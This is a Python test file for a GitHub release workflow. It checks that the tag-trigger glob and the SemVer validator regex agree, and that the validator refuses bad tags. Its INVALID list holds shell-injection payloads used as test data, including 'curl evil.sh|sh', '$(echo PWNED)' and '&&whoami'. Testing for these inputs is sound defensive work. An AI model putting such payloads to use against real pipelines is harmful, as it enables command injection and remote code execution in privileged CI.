"""The release trigger and the release tag validator must agree.

`.github/workflows/release.yml` filters tag pushes with a glob and then re-validates the tag
with `grep -Eq`. Those two have disagreed twice:

* the glob was `v*`, which also matched the floating major-version tag the published action
  uses (`ci@v1`), so re-pointing it started a release that then failed validation;
* the validator was `([-+][0-9A-Za-z.]+)?`, a SemVer subset that rejected legitimate
  `v1.2.3-rc-1` and `v1.2.3-rc.1+build.7`.

Both produce the same failure mode: a push that satisfies the trigger, starts a privileged
release run, and dies on validation. This test reads both out of the workflow and asserts
they cannot drift apart again.
"""
from __future__ import annotations

import re
import unittest
from pathlib import Path

WORKFLOW = Path(__file__).resolve().parents[1] / ".github/workflows/release.yml"

# Tags that are valid SemVer releases: the trigger should fire AND the validator accept.
VALID = [
    "v1.2.3", "v0.6.0", "v10.20.30", "v0.0.1",
    "v1.2.3-rc.1", "v1.2.3-rc-1", "v1.0.0-alpha.beta",
    "v1.2.3+build.7", "v1.2.3-rc.1+build.7",
]
# Tags the validator must refuse: non-releases, and shell-injection payloads that a crafted
# workflow_dispatch input could supply.
INVALID = [
    "v1", "v2", "v1.2", "vnext", "main", "master", "HEAD", "", "v", "1.2.3",
    "v01.2.3", "v1.2.3 ", " v1.2.3",
    'v0.6.0"; echo PWNED; "', "$(echo PWNED)", "v0.6.0; curl evil.sh|sh",
    "v1.2.3&&whoami", "v1.2.3`id`",
]


def _workflow_text() -> str:
    return WORKFLOW.read_text(encoding="utf-8")


def _trigger_globs() -> list[str]:
    """The `on.push.tags` globs, read straight out of the YAML (no yaml dependency)."""
    text = _workflow_text()
    block = re.search(r"^\s*tags:\s*$(.*?)^\s*workflow_dispatch:", text,
                      re.MULTILINE | re.DOTALL)
    assert block, "could not locate on.push.tags in release.yml"
    return re.findall(r'^\s*-\s*"([^"]+)"', block.group(1), re.MULTILINE)


def _validator_regex() -> str:
    """The ERE passed to `grep -Eq` in the tag-validation step."""
    m = re.search(r"grep -Eq '(\^v.*?)'", _workflow_text())
    assert m, "could not locate the grep -Eq tag validator in release.yml"
    return m.group(1)


def _glob_matches(glob: str, ref: str) -> bool:
    """GitHub ref filters: '*' matches any character except '/'."""
    rx = "^" + "".join("[^/]*" if c == "*" else re.escape(c) for c in glob) + "$"
    return re.match(rx, ref) is not None


def _triggers(ref: str) -> bool:
    return any(_glob_matches(g, ref) for g in _trigger_globs())


class TestReleaseTagPolicy(unittest.TestCase):
    def test_workflow_pieces_are_found(self):
        # Guard against the extraction silently returning nothing and passing vacuously.
        self.assertTrue(_trigger_globs(), "no tag globs extracted")
        self.assertTrue(_validator_regex().startswith("^v"), "no validator regex extracted")

    def test_validator_accepts_every_valid_semver_tag(self):
        rx = re.compile(_validator_regex())
        rejected = [t for t in VALID if not rx.match(t)]
        self.assertEqual(rejected, [], f"validator rejects valid SemVer tags: {rejected}")

    def test_validator_rejects_non_releases_and_injection_payloads(self):
        rx = re.compile(_validator_regex())
        accepted = [t for t in INVALID if rx.match(t)]
        self.assertEqual(accepted, [], f"validator accepts tags it must refuse: {accepted}")

    def test_no_legitimate_tag_triggers_a_run_it_cannot_pass(self):
        """The invariant that broke twice.

        A push that satisfies the trigger, starts a privileged release run and then dies on
        validation is a red X on a legitimate action. Scoped to real SemVer tags on purpose:
        a malformed or hostile ref (``v01.2.3``, ``v1.2.3`id```) matching the glob and then
        being refused by the validator is defence in depth, not a disagreement.
        """
        rx = re.compile(_validator_regex())
        disagree = [t for t in VALID if _triggers(t) and not rx.match(t)]
        self.assertEqual(
            disagree, [],
            "these valid tags start a release run and then fail validation: " + repr(disagree),
        )

    def test_hostile_refs_matching_the_glob_are_still_refused(self):
        """The flip side: the glob is not a security boundary, the validator is."""
        rx = re.compile(_validator_regex())
        slipped = [t for t in INVALID if _triggers(t)]
        self.assertTrue(slipped, "expected some hostile refs to match the glob")
        still_accepted = [t for t in slipped if rx.match(t)]
        self.assertEqual(still_accepted, [],
                         f"hostile refs passed the validator: {still_accepted}")

    def test_trigger_still_fires_for_real_releases(self):
        """The narrowing must not have gone so far that releases stop happening."""
        missed = [t for t in VALID if not _triggers(t)]
        self.assertEqual(missed, [], f"trigger no longer fires for real releases: {missed}")

    def test_floating_major_version_tags_are_ignored(self):
        """`ci@v1` is re-pointed as routine action maintenance; it must not start a release."""
        for tag in ("v1", "v2", "v10"):
            self.assertFalse(_triggers(tag), f"{tag} must not trigger the release workflow")


if __name__ == "__main__":
    unittest.main()
